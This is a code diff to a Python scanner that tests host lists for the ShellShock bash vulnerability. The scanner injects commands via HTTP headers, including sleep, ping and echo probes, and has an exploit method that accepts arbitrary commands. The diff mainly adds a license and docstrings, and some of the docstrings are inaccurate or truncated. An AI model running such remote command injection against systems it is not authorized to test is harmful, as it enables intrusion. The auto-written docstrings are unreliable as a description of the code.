@@ -1,7 +1,17 @@
-"""
-Scan a list of hosts with a list of CGIs trying to exploit
- the ShellShock vulnerability with different methods and payloads (CVE-2014-6271, CVE-2014-6278)
-"""
+#  Copyright © 2022 Kalynovsky Valentin. All rights reserved.
+#
+#  Licensed under the Apache License, Version 2.0 (the "License");
+#  you may not use this file except in compliance with the License.
+#  You may obtain a copy of the License at
+#
+#      http://www.apache.org/licenses/LICENSE-2.0
+#
+#  Unless required by applicable law or agreed to in writing, software
+#  distributed under the License is distributed on an "AS IS" BASIS,
+#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+#  See the License for the specific language governing permissions and
+#  limitations under the License.
+
 import http.client
 import string
 import sys
@@ -10,11 +20,8 @@ import pprint
 import csv
 import argparse
 from queue import Queue
-
 from threading import Thread
 
-
-# from Queue import Queue
 from src.log import Log
 
 
@@ -39,6 +46,14 @@ class CGIBugScanner(object):
     PROXY = None
 
     def request(self, target_host, path, headers):
+        """
+        If there's a proxy, use it. Otherwise, use the target host
+
+        :param target_host: the hostname of the target server
+        :param path: the path of the request, e.g. /api/v1/namespaces/default/pods
+        :param headers: a dictionary of headers to send with the request
+        :return: The status, reason, delay, and response.
+        """
         if PROXY:
             if protocol:
                 path = protocol + '://' + path
@@ -66,7 +81,14 @@ class CGIBugScanner(object):
         return (res.status, res.reason, delay, res)
 
     def exploit(self, target_host, cgi_path, command):
+        """
+        It sends a POST request to the target host, with the command to be executed in the headers
 
+        :param target_host: The host to attack
+        :param cgi_path: The path to the CGI script you want to exploit
+        :param command: The command to execute on the remote server
+        :return: The exploit function is returning the request function.
+        """
         shellcode = EXPLOIT % command
 
         headers = {"Content-type": "application/x-www-form-urlencoded",
@@ -78,6 +100,15 @@ class CGIBugScanner(object):
         return self.request(self, target_host, cgi_path, headers)
 
     def testShellShock(self, target_host, cgi_path, command):
+        """
+        The function takes in the target host, cgi path, and command to be executed. It then makes two requests, one with
+        the command and one without. It then returns the results of the requests
+
+        :param target_host: The host to test
+        :param cgi_path: The path to the CGI script
+        :param command: The command to be executed on the target host
+        :return: a dictionary with the following keys: host, cgi_path, requests, vulnerable, warning, error, and delay_diff.
+        """
         try:
             status1 = reason1 = delay1 = res1 = status2 = reason2 = delay2 = res2 = None
             command2 = command
@@ -117,14 +148,14 @@ class CGIBugScanner(object):
     def testSleep(self, target_host, cgi_path):
         """
         It tests if the target is vulnerable to the sleep test.
+
         :param target_host: The host to test
         :param cgi_path: The path to the CGI script you want to test
-        :return: A dictionary with the following keys:
+        :return: A dictionary with the following keys.
         """
         shellshocktest = self.testShellShock(target_host, cgi_path, "/usr/bin/env sleep %s" % self.SLEEP_TIME)
         if not shellshocktest['error']:
-            shellshocktest['warning'] = shellshocktest['requests'][1][
-                                            3] > self.SLEEP_TIME  # Delay command request > sleep time
+            shellshocktest['warning'] = shellshocktest['requests'][1][3] > self.SLEEP_TIME  # Delay command request > sleep time
             shellshocktest['vulnerable'] = shellshocktest['warning'] and shellshocktest['delay_diff'] > self.SLEEP_DELAY
             if shellshocktest['vulnerable']:
                 Log.out("%s%s\t VULNERABLE TO SLEEP TEST" % (target_host, cgi_path))
@@ -136,14 +167,20 @@ class CGIBugScanner(object):
     def testPing(self, target_host, cgi_path):
         """
         It tests if the target is vulnerable to the ping test.
+
         :param target_host: The host to test
         :param cgi_path: The path to the CGI script you want to test
         :return: A dictionary with the following keys:
+            error: True if there was an error, False otherwise
+            vulnerable: True if the target is vulnerable, False otherwise
+            warning: True if there was a warning, False otherwise
+            delay_diff: The difference between the delay command request and the sleep time
+            requests: A list of tuples containing the following:
+                0:
         """
         shellshocktest = self.testShellShock(target_host, cgi_path, "/usr/bin/env ping -c%s 127.0.0.1" % self.PING_PKTS)
         if not shellshocktest['error']:
-            shellshocktest['warning'] = shellshocktest['requests'][1][
-                                            3] > self.PING_DELAY  # Delay command request > sleep time
+            shellshocktest['warning'] = shellshocktest['requests'][1][3] > self.PING_DELAY  # Delay command request > sleep time
             shellshocktest['vulnerable'] = shellshocktest['warning'] and shellshocktest['delay_diff'] > self.PING_DELAY
             if shellshocktest['vulnerable']:
                 Log.out("%s%s\t VULNERABLE TO PING TEST" % (target_host, cgi_path))
@@ -152,16 +189,20 @@ class CGIBugScanner(object):
                 shellshocktest['requests'][1][3]))
         return shellshocktest
 
-    """
-    Dirty code everywhere :S
-    """
-
     def testString(self, target_host, cgi_path):
         """
         It tests if the target is vulnerable to the shellshock bug.
+
         :param target_host: The host to test
         :param cgi_path: The path to the CGI script you want to test
         :return: A dictionary with the following keys:
+        host
+        cgi_path
+        requests
+        vulnerable
+        warning
+        error
+        delay_diff
         """
         status = reason = delay = res = status = reason = delay = res2 = None
         command = 'echo -e "Content-type: text/html\\n\\n%s">&1' % self.TEST_STRING
@@ -195,7 +236,6 @@ class CGIBugScanner(object):
                               'delay_diff': 0
                               }
 
-
         if not shellshocktest['error']:
             shellshocktest['warning'] = shellshocktest['requests'][1][
                                             4] > self.PING_DELAY  # Delay command request > sleep time
@@ -207,6 +247,14 @@ class CGIBugScanner(object):
         return shellshocktest
 
     def testCGIList(self, target_host, cgi_list):
+        """
+        It loops through a list of CGI paths, and for each path, it runs three tests (sleep, ping, and string) and appends
+        the results to a list
+
+        :param target_host: The host to test
+        :param cgi_list: A list of CGI paths to test
+        :return: A list of dictionaries.
+        """
         test_list = []
         errors = 0
         for cgi_path in cgi_list:
@@ -248,6 +296,10 @@ class CGIBugScanner(object):
         return test_list
 
     def threadWork(self):
+        """
+        It takes a target and a list of CGI scripts, tests each CGI script for vulnerabilities, and appends the results to a
+        list
+        """
         while True:
             (target, cgi_list) = q.get()
             host_tests = self.testCGIList(target, cgi_list)
@@ -255,6 +307,14 @@ class CGIBugScanner(object):
             q.task_done()
 
     def scan(self, target_list, cgi_list):
+        """
+        It takes a list of targets and a list of cgi scripts and then runs the threadWork function on each target and cgi
+        script
+
+        :param target_list: a list of targets to scan
+        :param cgi_list: a list of cgi files to scan for
+        :return: Nothing is being returned.
+        """
         global q
         q = Queue(concurrent * 2)
         for i in range(concurrent):
@@ -269,6 +329,12 @@ class CGIBugScanner(object):
             return
 
     def writeCSV(self, target_results, output):
+        """
+        It takes a list of dictionaries, and writes the contents of each dictionary to a row in a CSV file
+
+        :param target_results: This is the list of dictionaries that we created in the previous step
+        :param output: The name of the file to write the results
+        """
         csvf = open(output, 'w')
         csvw = csv.writer(csvf, csv.excel)
         csvw.writerow(['HOST', 'CGIPATH', 'VULNERABLE', 'ERROR', 'WARNING', 'COMMAND1', 'STATUS1', 'REASON1', 'DELAY1',
@@ -296,6 +362,14 @@ class CGIBugScanner(object):
         csvf.close()
 
     def main(self, host_file, cgi_file, output_file):
+        """
+        main() takes in a host file, a cgi file, and an output file, and then scans the hosts for the cgis, and writes the
+        results to the output file
+
+        :param host_file: a file containing a list of hosts to scan
+        :param cgi_file: The file containing the list of CGI scripts to scan
+        :param output_file: The name of the file to write the results
+        """
         hostlist_file = host_file
         cgilist_file = cgi_file
         # http|https
